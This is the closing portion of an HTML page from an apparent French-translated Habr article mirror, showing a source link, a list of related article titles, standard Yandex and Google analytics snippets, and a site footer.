coûtant 9 000 euros pour un sou?</a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr424289/">https://habr.com/ru/post/fr424289/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr424275/index.html">L'énergie dans la cellule. Utilisation et stockage</a></li>
<li><a href="../fr424277/index.html">L'émigration et tout ce qu'elle contient dans les blogs de télégrammes</a></li>
<li><a href="../fr424279/index.html">Comment ouvrir une adresse IP en Allemagne, si vous êtes programmeur et ne pas remplir de cônes</a></li>
<li><a href="../fr424285/index.html">Conseils de démarrage Y Combinator: Développer des marchés de jouets</a></li>
<li><a href="../fr424287/index.html">Comment nous avons participé à InnovateFPGA 2018 et n'avons pas gagné à nouveau</a></li>
<li><a href="../fr424295/index.html">Cours MIT "Sécurité des systèmes informatiques". Conférence 9: «Sécurité des applications Web», partie 2</a></li>
<li><a href="../fr424297/index.html">Cours MIT "Sécurité des systèmes informatiques". Conférence 9: Sécurité des applications Web, partie 3</a></li>
<li><a href="../fr424301/index.html">Algorithme de filtre d'image de réseau neuronal adaptatif</a></li>
<li><a href="../fr424305/index.html">RIB pour architecture mobile multiplateforme Uber</a></li>
<li><a href="../fr424307/index.html">GitLab 11.3 publié avec le référentiel Maven et les environnements sécurisés</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>